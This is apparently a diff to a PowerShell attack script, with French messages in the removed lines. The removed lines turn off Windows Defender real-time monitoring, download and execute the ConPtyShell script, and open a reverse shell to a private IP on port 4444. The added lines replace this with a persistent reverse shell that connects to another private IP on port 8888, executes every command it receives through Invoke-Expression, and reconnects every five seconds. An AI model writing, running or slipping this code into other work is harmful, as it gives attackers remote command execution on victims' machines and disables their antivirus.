@@ -1,26 +1,29 @@
-Try {
-    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
-    Write-Host "Protection en temps réel désactivée."
-} Catch {
-    Write-Warning "Impossible de désactiver la protection en temps réel : $_"
-}
+$h='10.205.202.206'
+$p=8888
 
-$scriptUrl = "https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1"
-Try {
-    $scriptContent = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -ErrorAction Stop
-    Invoke-Expression $scriptContent.Content
-    Write-Host "Script Invoke-ConPtyShell chargé."
-} Catch {
-    Write-Warning "Erreur lors du téléchargement ou de l'exécution du script : $_"
-    Exit 1
-}
-
-$ip = "172.19.137.12"
-$port = 4444
-
-Try {
-    Invoke-ConPtyShell $ip $port
-    Write-Host "Reverse shell lancé vers $ip : $port"
-} Catch {
-    Write-Warning "Erreur lors de l'exécution du reverse shell : $_"
+while($true){
+    try{
+        $a=New-Object Net.Sockets.TCPClient($h,$p)
+        $s=$a.GetStream()
+        $b=New-Object Byte[] 65535
+        $e=New-Object Text.ASCIIEncoding
+        
+        while(($i=$s.Read($b,0,$b.Length)) -ne 0){
+            $d=$e.GetString($b,0,$i).Trim()
+            if (![string]::IsNullOrWhiteSpace($d)) {
+                try{
+                    $r=(Invoke-Expression $d 2>&1 | Out-String)
+                }catch{
+                    $r=$_.Exception.Message
+                }
+                $r2=$r+"`nPS "+(pwd).Path+"> "
+                $sb=$e.GetBytes($r2)
+                $s.Write($sb,0,$sb.Length)
+                $s.Flush()
+            }
+        }
+        $a.Close()
+    }catch{
+        Start-Sleep -Seconds 5
+    }
 }
